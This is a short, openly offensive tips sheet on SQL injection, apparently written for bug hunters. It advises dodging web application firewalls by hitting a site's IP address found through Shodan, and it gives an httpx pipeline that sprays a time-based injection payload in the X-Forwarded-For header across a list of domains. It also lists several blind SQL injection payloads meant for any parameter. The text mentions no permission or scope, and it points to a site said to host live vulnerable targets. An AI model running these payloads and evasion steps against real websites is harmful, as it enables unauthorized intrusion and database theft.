# SQL Injection 

SQL injection Tips :

Hello hackers, if you don't find correct results use Ghauri instead of sqlmap 

* Dont use --batch in sqlmap always stay manual because sometimes its location gets redirected

* try website IP instead of  domain so waf cannot block you use shodan 

* use burp intruder and see the response completed when spraying SQL injection payloads in any param

* If you not good at SQL injection try this website with live real SQL injection here  https[:]//cxsecurity[.]com/

* use this command for automation for SQL injection 
  any gau  or waybackurls paramaspider  with gf sqli or your own parameter     by kxss

cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'

* use SQL injection waf only needed use atlas tool by  m4ll0k

* For blind SQL injection try payloads like this every time you see any params

0'XOR(if(now()=sysdate(),sleep(6),0))XOR'   ---> sql


0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z%20=%3E

0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z

'%20WAITFOR%20DELAY%20'0:0:5'--

if(now()=sysdate(),sleep(3),0)
